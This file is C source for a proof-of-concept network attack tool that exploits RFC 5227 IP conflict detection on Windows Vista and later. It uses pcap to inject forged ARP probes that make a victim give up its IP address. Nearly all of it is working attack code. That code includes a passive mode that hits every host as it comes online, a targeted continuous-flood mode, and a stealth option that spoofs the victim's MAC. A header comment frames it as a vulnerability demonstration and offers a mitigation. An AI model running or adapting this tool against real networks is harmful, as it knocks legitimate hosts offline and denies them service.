/*
 * RFC 5227 Attack
 * ml5227.c
 *
 * Written by Michael Laforest
 * Feb 2015
 *
 * This program exploits RFC 5227 section 4.1.1:
 * http://tools.ietf.org/html/rfc5227#section-2.1.1
 *
 *   If during this period, from the beginning of the probing process
 *   until ANNOUNCE_WAIT seconds after the last probe packet is sent, the
 *   host receives any ARP packet (Request *or* Reply) on the interface
 *   where the probe is being performed, where the packet's 'sender IP
 *   address' is the address being probed for, then the host MUST treat
 *   this address as being in use by some other host, and should indicate
 *   to the configuring agent (human operator, DHCP server, etc.) that the
 *   proposed address is not acceptable.
 *
 * The above section is enforced by Windows Vista and later.
 *
 * If the above occurs on a vulenerable Windows host the host will
 * consider the IP address to be in conflict and invalid.
 *
 * In the case of DHCP it will attempt to obtain another address.
 * In the case of a static IP it will revert to a link local address.
 *
 * This program has two modes of operation:
 *
 *   1) Listen / Passive
 *      The program will continuously run listening for ARP probes from
 *      a host that is attempting to come online.
 *      In response this program will send an ARP probe of its own with
 *      the same IP to the host.  If the host honors the above RFC
 *      rules then it will be denied the ability to use that IP address.
 *
 *  2) Target / Attack
 *     The program will send one or many ARP probes with the specified
 *     IP to one specific host.
 *
 * The purpose of this program is to serve as a proof of concept and
 * to demonstrate an existing vulenerability introduced by the above RFC.
 * As a solution it is recommended to disable the IP address conflict
 * detection mechanism within Windows.
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <malloc.h>
#include <pcap.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>

#define FLAG_LISTEN		0x01
#define FLAG_CONT		0x02
#define FLAG_STEALTH	0x04
#define IS_SET(v)		((g_flags & v) == v)

struct arp_t {
	short htype;
	short ptype;
	char hlen;
	char plen;
	short op;
	char s_mac[6];
	char s_ip[4];
	char d_mac[6];
	char d_ip[4];
};

char* g_netdev;
pcap_t* g_pcap_handle;
int g_flags = 0;

void sniff(double probability);
void send_arp_probe(struct arp_t* arp);
void attack(char* ip, char* mac, char* sdelay);

int main(int argc, char** argv) {
	char* target_ip = NULL;
	char* target_mac = NULL;
	char* attack_delay = "0";
	char* attack_prob = "1.0";

	printf("5227 Attack v0.2\n"
			"Written by: Michael Laforest\n"
			"Feb 2015\n"
			"\n"
			"Options: %s <-l [-p <X>] | -t <IP Address> [-m <MAC Address>] [-c] [-d <usec>]> [-S]\n"
			"\n"
			"-l\tListen mode. Listen for ARP probes and attack the source host.\n"
			"-t\tTarget mode. Send ARP probes to the host at this IP address.\n"
			"-S\tStealth. Use the target's MAC as our source MAC.\n"
			"-m\t(Target mode only) Specify the MAC address of the target host.i (fmt: \\xAA\\xBB\\xCC\\xDD\\xEE\\xFF)\n"
			"-c\t(Target mode only) Continuously attack the target as opposed to just once.\n"
			"-d\t(Target mode only) Delay attacks by msec microseconds.\n"
			"-p\t(Listen mode only) Probability of attacking when sniffed an ARP probe. (0.0 <= x <= 1.0) (Default 1.0)\n",
			argv[0]
	);

	int c = 0;
	for (;;) {
		c = getopt(argc, argv, "t:ld:p:m:cS");
		if (c == -1)
			break;

		switch (c) {
			case 't':
				target_ip = strdup((char*)optarg);
				break;
			case 'm':
				target_mac = strdup((char*)optarg);
				break;
			case 'd':
				attack_delay = strdup((char*)optarg);
				break;
			case 'p':
				attack_prob = strdup((char*)optarg);
				break;
			case 'c':
				g_flags |= FLAG_CONT;
				break;
			case 'l':
				g_flags |= FLAG_LISTEN;
				break;
			case 'S':
				g_flags |= FLAG_STEALTH;
				break;
		}
	}

	if (target_ip && IS_SET(FLAG_LISTEN)) {
		printf("-t and -l are mutually exclusive.\n");
		return 0;
	}
	if (!target_ip && !(IS_SET(FLAG_LISTEN))) {
		printf("Select an attack type.\n");
		return 0;
	}

	printf("\n----------------\n"
			"OPERATING MODE\n"
			"----------------\n"
			"       Mode: %s\n"
			"  Target IP: %s\n"
			" Target MAC: %s\n"
			"    Stealth: %s\n"
			"      Delay: %s microseconds\n"
			" Continuous: %s\n"
			"Probability: %s\n",
			IS_SET(FLAG_LISTEN) ? "Passive" : "Target",
			target_ip,
			target_mac,
			IS_SET(FLAG_STEALTH) ? "yes" : "no",
			attack_delay,
			IS_SET(FLAG_CONT) ? "yes" : "no",
			attack_prob
	);

	char ebuf[PCAP_ERRBUF_SIZE]; 
	g_netdev = pcap_lookupdev(ebuf);
	if (!g_netdev) {
		printf("[ERROR] %s\n", ebuf);
		return 1;
	}

	srand(time(NULL));

	if (IS_SET(FLAG_LISTEN)) {
		double p = -1;
		int r = sscanf(attack_prob, "%lf", &p);
		if (!r || (p<0.0) || (p>1.0)) {
			printf("[ERROR] '%s' is not a valid probability (0.0 <= x <= 1.0)\n", attack_prob);
			return 1;
		}
		sniff(p);
	} else if (target_ip)
		attack(target_ip, target_mac, attack_delay);

	return 0;
}

void sniff(double probability) {
	char ebuf[PCAP_ERRBUF_SIZE]; 
	const u_char* packet;
	struct pcap_pkthdr h;
	struct ether_header* frame;
	struct arp_t* arp;

	printf("[INFO] Listening on device %s...\n", g_netdev);
	g_pcap_handle = pcap_open_live(g_netdev, BUFSIZ, 1, -1, ebuf);
	if (!g_pcap_handle) {
		printf("[ERROR] %s\n", ebuf);
		return;
	}

	while (1) {
		packet = pcap_next(g_pcap_handle, &h);
		if (!packet)
			continue;

		char tbuf[64];
		ctime_r((const time_t*)&h.ts.tv_sec, tbuf);
		tbuf[strlen(tbuf)-1] = 0;

		frame = (struct ether_header*)packet;

		if (ntohs(frame->ether_type) != ETHERTYPE_ARP)
			continue;

		printf("\nTime: %s\tLen: %i\n", tbuf, h.len);

		arp = (struct arp_t*)((char*)packet + sizeof(struct ether_header));

		if (ntohs(arp->htype) != 1) {
			printf(" ARP hardware type not ethernet\n");
			continue;
		}
		if (ntohs(arp->ptype) != 0x0800) {
			printf(" ARP protocol type not IP\n");
			continue;
		}
		if (ntohs(arp->op) != 1) {
			printf(" ARP is a reply\n");
			continue;
		}
		if (!memcmp(arp->s_mac, "\x11\x22\x33\x44\x55\x66", 6)) {
			printf(" ARP packet came from us\n");
			continue;
		}

		printf(" -> MAC: %.2x:%.2x:%.2x:%.2x:%.2x:%.2x -> %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n",
				arp->s_mac[0]&0xFF,	arp->s_mac[1]&0xFF,
				arp->s_mac[2]&0xFF,	arp->s_mac[3]&0xFF,
				arp->s_mac[4]&0xFF,	arp->s_mac[5]&0xFF,
				arp->d_mac[0]&0xFF,	arp->d_mac[1]&0xFF,
				arp->d_mac[2]&0xFF,	arp->d_mac[3]&0xFF,
				arp->d_mac[4]&0xFF,	arp->d_mac[5]&0xFF
			);
		printf(" ->  IP: %i.%i.%i.%i -> %i.%i.%i.%i\n",
				arp->s_ip[0]&0xFF, arp->s_ip[1]&0xFF, 
				arp->s_ip[2]&0xFF, arp->s_ip[3]&0xFF, 
				arp->d_ip[0]&0xFF, arp->d_ip[1]&0xFF, 
				arp->d_ip[2]&0xFF, arp->d_ip[3]&0xFF 
			);

		if ((arp->s_ip[0]&0xFF) || (arp->s_ip[1]&0xFF) || (arp->s_ip[2]&0xFF) || (arp->s_ip[3]&0xFF))
			continue;

		printf(" *** ARP Probe ***\n");

		if ((probability < 1.0) && (rand() >= probability * ((double)RAND_MAX + 1.0))) {
			printf(" *** Skipping due to probability\n");
			continue;
		}

		struct arp_t evil_arp;
		evil_arp.htype = htons(1);
		evil_arp.ptype = htons(0x0800);
		evil_arp.hlen = 6;
		evil_arp.plen = 4;
		evil_arp.op = htons(1);

		
		memcpy(evil_arp.s_mac, "\x11\x22\x33\x44\x55\x66", 6);
		memcpy(evil_arp.s_ip, "\x00\x00\x00\x00", 4);
		memcpy(evil_arp.d_mac, arp->s_mac, 6);
		memcpy(evil_arp.d_ip, arp->d_ip, 4);

		send_arp_probe(&evil_arp);
	}
}


void send_arp_probe(struct arp_t* arp) {
	char ebuf[PCAP_ERRBUF_SIZE]; 
	
	if (!g_netdev)
		return;
	
	pcap_t* pcap = pcap_open_live(g_netdev, 96, 0, 0, ebuf);
	if (!pcap) {
		printf("[ERROR] %s\n", ebuf);
		return;
	}

	struct ether_header frame;
	frame.ether_type = htons(ETHERTYPE_ARP);
	memcpy(frame.ether_dhost, arp->d_mac, sizeof(frame.ether_dhost));

	if (IS_SET(FLAG_STEALTH))	memcpy(frame.ether_shost, arp->d_mac, sizeof(frame.ether_shost));
	else						memcpy(frame.ether_shost, arp->s_mac, sizeof(frame.ether_shost));

	int len = sizeof(struct ether_header) + sizeof(struct arp_t);
	char* data = (char*)malloc(len);
	memcpy(data, &frame, sizeof(frame));
	memcpy(data+sizeof(frame), arp, sizeof(struct arp_t));

	char* darp = (data + sizeof(frame));
	printf(" <- ETH MAC: %.2x:%.2x:%.2x:%.2x:%.2x:%.2x -> %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n"
	       " <- ARP MAC: %.2x:%.2x:%.2x:%.2x:%.2x:%.2x -> %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n"
		   " <- ARP  IP: %i.%i.%i.%i -> %i.%i.%i.%i\n",
			data[6]&0xFF, data[7]&0xFF, data[8]&0xFF, data[9]&0xFF, data[10]&0xFF, data[11]&0xFF,
			data[0]&0xFF, data[1]&0xFF, data[2]&0xFF, data[3]&0xFF,  data[4]&0xFF,  data[5]&0xFF,
			 darp[8]&0xFF,  darp[9]&0xFF, darp[10]&0xFF, darp[11]&0xFF, darp[12]&0xFF, darp[13]&0xFF,
			darp[18]&0xFF, darp[19]&0xFF, darp[20]&0xFF, darp[21]&0xFF, darp[22]&0xFF, darp[23]&0xFF,
			darp[14]&0xFF, darp[15]&0xFF, darp[16]&0xFF, darp[17]&0xFF,
			darp[24]&0xFF, darp[25]&0xFF, darp[26]&0xFF, darp[27]&0xFF);

	int r = pcap_inject(pcap, data, len);
	printf(" *** ATTACK: Sent evil ARP probe (%i bytes) ***\n", r);
	if (r == -1) {
		pcap_perror(g_pcap_handle, "[ERROR]");
	}

	free(data);
	pcap_close(pcap);
}


void attack(char* ip, char* mac, char* sdelay) {
	int delay = 0;
	
	if (sdelay)
		sscanf(sdelay, "%i", &delay);

	struct in_addr d_ip = {0};
	if (!inet_aton(ip, &d_ip)) {
		printf("[ERROR] '%s' is not a valid IP address.\n", ip);
		return;
	}

	struct arp_t evil_arp = {0};
	evil_arp.htype = htons(1);
	evil_arp.ptype = htons(0x0800);
	evil_arp.hlen = 6;
	evil_arp.plen = 4;
	evil_arp.op = htons(1);

	memcpy(evil_arp.s_mac, "\x11\x22\x33\x44\x55\x66", 6);
	memcpy(evil_arp.s_ip, "\x00\x00\x00\x00", 4);
	memcpy(evil_arp.d_ip, &d_ip.s_addr, 4);

	if (mac) {
		int r = sscanf(mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
						&evil_arp.d_mac[0], &evil_arp.d_mac[1], &evil_arp.d_mac[2],
						&evil_arp.d_mac[3], &evil_arp.d_mac[4],	&evil_arp.d_mac[5]);
		if (r == 0) {
			printf("[ERROR] '%s' is not a valid MAC address.\n", mac);
			return;
		}
	} else {
		memcpy(evil_arp.d_mac, "\xDE\xAD\xBE\xEF\x01\x02", 6);
	}

	do {
		printf("\n");

		send_arp_probe(&evil_arp);

		if (delay && IS_SET(FLAG_CONT))
			usleep(delay);

	} while (IS_SET(FLAG_CONT));
}
